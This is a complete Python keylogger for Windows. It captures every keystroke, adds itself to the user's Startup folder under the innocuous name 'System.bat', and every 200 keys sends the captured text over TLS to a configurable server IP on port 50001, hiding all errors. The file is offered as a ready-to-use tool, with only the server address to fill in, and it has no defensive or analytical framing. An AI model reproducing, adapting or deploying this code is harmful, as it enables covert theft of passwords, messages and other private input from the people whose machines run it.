#Keylogger send info every 200 keys pressed
#Have to configure your public or private SERVER-IP
import socket
from pynput import keyboard
from OpenSSL import SSL
from os import path,environ
limit = 200
words = []

def add_to_startup():
    try:
        file_path = path.realpath(__file__)
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % environ.get('USERNAME')
        with open(bat_path + '\\' + "System.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)
    except:
        pass

def on_press(key):
    global words
    global limit
    try:
        words.append(key.char)
    except AttributeError:
        if(str(key) == 'Key.backspace'):
            try:
                words.pop()
            except:
                pass
        elif(str(key) == 'Key.space' ):
            try:
                words.append(' ')
            except:
                pass
        else:
            words.append(str(key))
    if(len(words) > limit):
        limit = limit + 200
        send_info(words)

def send_info(info):
    try:
        HOST = ('SERVER-IP',50001) #ADD YOUR PUBLIC OR PRIVATE IP
        context = SSL.Context(SSL.TLSv1_2_METHOD)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM, 0)
        connection = SSL.Connection(context,s)
        connection.connect(HOST)
        connection.sendall(str(info).encode('utf-8'))
        connection.shutdown()
    except:
        pass


def main():
    add_to_startup()
    with keyboard.Listener(
        on_press=on_press) as listener:
        listener.join()
    listener.start()
    

if __name__ == "__main__":
    main()